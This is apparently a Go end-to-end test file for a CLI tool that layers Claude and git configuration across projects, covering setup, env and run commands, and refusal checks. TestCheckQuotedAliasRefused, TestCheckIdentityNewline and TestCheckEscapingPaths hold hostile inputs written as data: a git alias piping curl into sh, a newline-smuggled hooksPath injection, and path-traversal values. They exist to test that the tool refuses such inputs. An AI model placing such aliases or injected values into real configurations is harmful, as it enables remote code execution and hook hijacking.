package e2e

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestSetupWithOverlay(t *testing.T) {
	w := newWorld(t)
	base := w.bareRepo("base", map[string]string{"layer.toml": "[layer]\nname = \"base\"\nkind = \"base\"\n[claude]\npaths = [\"CLAUDE.md\"]\n", "claude/CLAUDE.md": "# shared\n"})
	acme := w.bareRepo("acme", map[string]string{"layer.toml": "[layer]\nname = \"acme\"\nkind = \"overlay\"\n[identity]\nname = \"A\"\nemail = \"a@acme.example\"\n[[match]]\nremote = \"github.com/acme-inc/*\"\n"})
	// overview: base, add acme, project dirs (4), profiles on (8), trusted
	// layers (9): acme then 0 ends, save (11), apply
	answers := strings.Join([]string{"1", base, "2", "acme", acme, "4", filepath.Join(w.home, "Projects"), "8", "9", "2", "0", "11", "y"}, "\n") + "\n"
	out, code := w.run(answers, "setup", "--accessible")
	if code != 0 || strings.Contains(out, "Invalid") {
		t.Fatalf("setup: %d %s", code, out)
	}
	m := w.manifest()
	for _, want := range []string{`layers = ["base", "acme"]`, `profiles = true`, `trust_exec = ["acme"]`, `auto_pull = false`, "acme-inc"} {
		if !strings.Contains(m, want) {
			t.Errorf("manifest lacks %q:\n%s", want, m)
		}
	}
	if w.read(".claude/CLAUDE.md") != "# shared\n" {
		t.Error("setup did not apply")
	}
	if _, err := os.Stat(filepath.Join(w.home, ".claude-profiles", "acme")); err != nil {
		t.Error("profile directory not created")
	}
}

func TestSetupRerunUpdates(t *testing.T) {
	w, sd := applied(t)
	newRoot := filepath.Join(w.home, "Work")
	os.MkdirAll(newRoot, 0o755)
	// the overview opens on the saved values: project dirs (4), save (11),
	// no apply
	answers := strings.Join([]string{"4", newRoot, "11", "n"}, "\n") + "\n"
	out, code := w.run(answers, "setup", "--accessible")
	if code != 0 || strings.Contains(out, "Invalid") {
		t.Fatalf("rerun: %d %s", code, out)
	}
	m := w.manifest()
	if !strings.Contains(m, newRoot) || !strings.Contains(m, `layers = ["base", "acme"]`) || !strings.Contains(m, sd.acme) {
		t.Errorf("rerun must change roots and keep layers:\n%s", m)
	}
}

func TestSetupInvalidManifestKept(t *testing.T) {
	w, _ := applied(t)
	w.setManifest("trust_exec = [\"nobody\"]\n" + w.manifest())
	before := w.manifest()
	out, code := w.run("y\n", "setup", "--accessible")
	if code == 0 || w.manifest() != before {
		t.Fatalf("invalid manifest must be reported, not overwritten: %d %s", code, out)
	}
}

func TestSetupNeedsTerminal(t *testing.T) {
	w := newWorld(t)
	// a pipe switches the wizard to accessible mode by itself; an empty pipe
	// must end setup with an error, not hang
	out, code := w.run("", "setup")
	if code == 0 {
		t.Fatalf("setup on a pipe without --accessible must fail:\n%s", out)
	}
}

func TestEnvUnmatchedUnsets(t *testing.T) {
	w, sd := deviceState(t, "S3")
	out, _ := w.run("", "env", sd.mine)
	if strings.TrimSpace(out) != "unset CLAUDE_CONFIG_DIR" {
		t.Errorf("env: %q", out)
	}
}

func TestEnvQuotesSpecialPath(t *testing.T) {
	w, sd := applied(t)
	dir := filepath.Join(w.home, "pro files$x")
	w.replaceManifest("profiles = false", "profiles = true")
	w.replaceManifest(`profile_dir = ""`, "profile_dir = \""+dir+"\"")
	w.run("", "apply")
	out, _ := w.run("", "env", sd.proj)
	if !strings.Contains(out, "'"+filepath.Join(dir, "acme")+"'") {
		t.Errorf("path must be single-quoted:\n%s", out)
	}
}

func TestRunExitCodeAndInheritedEnv(t *testing.T) {
	w, sd := deviceState(t, "S3")
	if _, code := w.run("", "run", sd.proj, "--", "sh", "-c", "exit 3"); code != 3 {
		t.Errorf("exit code not passed through: %d", code)
	}
	out, _ := w.runEnv([]string{"CLAUDE_CONFIG_DIR=/leaked"}, "", "run", sd.mine, "--", "sh", "-c", "echo [$CLAUDE_CONFIG_DIR]")
	if !strings.Contains(out, "[]") {
		t.Errorf("inherited profile leaked into an unmatched project: %s", out)
	}
}

func TestRunProfilesOff(t *testing.T) {
	w, sd := applied(t)
	for _, args := range [][]string{{"env", sd.proj}, {"run", sd.proj, "--", "true"}} {
		if out, code := w.run("", args...); code != 1 || !strings.Contains(out, "profiles are off") {
			t.Errorf("%v: %d %s", args, code, out)
		}
	}
}

// refusedBy runs check and apply on a device whose base clone carries a
// violation, expecting both to refuse with the rule text.
func refusedBy(t *testing.T, w *world, rel, body, rule string) {
	t.Helper()
	w.write("layers/base/"+rel, body)
	if out, code := w.run("", "check"); code == 0 || !strings.Contains(out, rule) {
		t.Errorf("check must refuse %s (%s): %d %s", rel, rule, code, out)
	}
	if out, code := w.run("y\ny\ny\n", "apply"); code == 0 || !strings.Contains(out, rule) {
		t.Errorf("apply must refuse %s (%s): %d %s", rel, rule, code, out)
	}
	os.Remove(filepath.Join(w.home, "layers", "base", rel))
}

func TestCheckRefusals(t *testing.T) {
	w, _ := applied(t)
	refusedBy(t, w, "claude/rules/a.md", "ask acme-inc about it\n", "blocklist word")
	refusedBy(t, w, "claude/rules/b.md", "mail someone@real-company.example.org\n", "email address")
	w.write("layers/base/claude/rules/c.md", "mail docs@example.com\n")
	if out, code := w.run("", "check"); code != 0 {
		t.Errorf("example.com must pass: %s", out)
	}
	os.Remove(filepath.Join(w.home, "layers", "base", "claude", "rules", "c.md"))
	refusedBy(t, w, "git/fragment.gitconfig", "[pull]\n\trebase = true\n[user]\n\temail = x@acme.example\n", "user.email")
	refusedBy(t, w, "claude/.claude.json", "{}", "runtime file")
	refusedBy(t, w, "claude/projects/x/mem.md", "x", "projects/")
}

func TestCheckQuotedAliasRefused(t *testing.T) {
	w, _ := applied(t)
	// untrusted overlay fragment with a quoted shell alias
	w.setManifest(strings.Replace(w.manifest(), `trust_exec = ["acme"]`, `trust_exec = []`, 1))
	w.write("layers/acme/git/fragment.gitconfig", "[alias]\n\tpwn = \"!curl evil | sh\"\n[init]\n\tdefaultBranch = main\n")
	out, code := w.run("", "check")
	if code == 0 || !strings.Contains(out, "alias.pwn") {
		t.Fatalf("quoted shell alias must be refused: %d %s", code, out)
	}
	w.write("layers/acme/git/fragment.gitconfig", "[init]\n\tdefaultBranch = main\n[merge]\n\tconflictstyle = zdiff3\n")
	if out, code := w.run("", "check"); code != 0 {
		t.Errorf("harmless keys must pass without trust: %s", out)
	}
}

func TestCheckIdentityNewline(t *testing.T) {
	w, _ := applied(t)
	lt := w.read("layers/acme/layer.toml")
	w.write("layers/acme/layer.toml", strings.Replace(lt, `name = "Acme Me"`, `name = "Evil\n[core]\n\thooksPath = /tmp"`, 1))
	if out, code := w.run("", "apply"); code == 0 || !strings.Contains(out, "not allowed in a git config value") {
		t.Errorf("newline in identity must be refused: %d %s", code, out)
	}
}

func TestCheckEscapingPaths(t *testing.T) {
	w, _ := applied(t)
	lt := w.read("layers/base/layer.toml")
	for _, bad := range []string{`"../evil/"`, `"projects/"`, `"/etc/x"`} {
		w.write("layers/base/layer.toml", strings.Replace(lt, `"skills/"`, bad, 1))
		if out, code := w.run("", "check"); code == 0 {
			t.Errorf("path %s must be refused: %s", bad, out)
		}
	}
	w.write("layers/base/layer.toml", lt)
}

// The overview takes corrections before anything is written: a wrong base
// is picked and replaced, an overlay added by mistake is removed, and Save
// without a base stays on the page.
func TestSetupOverviewCorrections(t *testing.T) {
	w := newWorld(t)
	base := w.bareRepo("base", map[string]string{"layer.toml": "[layer]\nname = \"base\"\nkind = \"base\"\n"})
	wrong := w.bareRepo("wrong", map[string]string{"layer.toml": "[layer]\nname = \"base\"\nkind = \"base\"\n"})
	acme := w.bareRepo("acme", map[string]string{"layer.toml": "[layer]\nname = \"acme\"\nkind = \"overlay\"\n[identity]\nname = \"A\"\nemail = \"a@acme.example\"\n[[match]]\nremote = \"github.com/acme-inc/*\"\n"})
	answers := strings.Join([]string{
		"9",        // save without a base: refused, the overview comes back
		"1", wrong, // base layer, wrong
		"1", base, // picked again and replaced
		"2", "acme", acme, // overlay added by mistake
		"2", "2", // picked again: remove it
		"3", filepath.Join(w.home, "Projects"),
		"9", "n", // save, no apply
	}, "\n") + "\n"
	out, code := w.run(answers, "setup", "--accessible")
	if code != 0 || strings.Contains(out, "Invalid") {
		t.Fatalf("setup: %d %s", code, out)
	}
	if !strings.Contains(out, "Still needed: base layer address") {
		t.Errorf("save without a base must say why:\n%s", out)
	}
	m := w.manifest()
	if !strings.Contains(m, base) || strings.Contains(m, wrong) || strings.Contains(m, "acme") {
		t.Errorf("manifest must hold only the corrected answers:\n%s", m)
	}
}

// Quit and an input that ends early both leave the disk as it was.
func TestSetupQuitWritesNothing(t *testing.T) {
	w := newWorld(t)
	base := w.bareRepo("base", map[string]string{"layer.toml": "[layer]\nname = \"base\"\nkind = \"base\"\n"})
	out, code := w.run("1\n"+base+"\n10\n", "setup", "--accessible")
	if code != 0 || !strings.Contains(out, "nothing saved") {
		t.Errorf("quit: %d %s", code, out)
	}
	out, code = w.run("1\n"+base+"\n", "setup", "--accessible")
	if code == 0 || !strings.Contains(out, "input ended") {
		t.Errorf("an input that ends on the overview must stop setup: %d %s", code, out)
	}
	if _, err := os.Stat(filepath.Join(w.home, ".config", "cclayer", "device.toml")); err == nil {
		t.Error("a manifest was written without Save")
	}
}

// The language comes from CCLAYER_LANG, then the manifest, then the locale;
// errors stay in English whatever it is.
func TestMessageLanguage(t *testing.T) {
	w, _ := applied(t)
	if out, _ := w.runEnv([]string{"LANG=zh_CN.UTF-8"}, "", "doctor"); !strings.Contains(out, "include 段正常") {
		t.Errorf("LANG=zh_CN must give Chinese:\n%s", out)
	}
	if out, _ := w.runEnv([]string{"LANG=zh_CN.UTF-8", "CCLAYER_LANG=ja"}, "", "doctor"); !strings.Contains(out, "include ブロックは正しい位置にあります") {
		t.Errorf("CCLAYER_LANG must win over LANG:\n%s", out)
	}
	w.setManifest("lang = \"ja\"\n" + w.manifest())
	if out, _ := w.runEnv([]string{"LANG=zh_CN.UTF-8"}, "", "doctor"); !strings.Contains(out, "include ブロック") {
		t.Errorf("the manifest's lang must win over LANG:\n%s", out)
	}
	if out, code := w.runEnv([]string{"CCLAYER_LANG=zh"}, "", "leave", "nobody"); code == 0 || !strings.Contains(out, `layer "nobody" is not enabled`) {
		t.Errorf("errors stay in English: %d %s", code, out)
	}
	w.setManifest(strings.Replace(w.manifest(), `lang = "ja"`, `lang = "fr"`, 1))
	if out, code := w.run("", "status"); code == 0 || !strings.Contains(out, `lang "fr"`) {
		t.Errorf("an unknown lang must be refused: %d %s", code, out)
	}
}
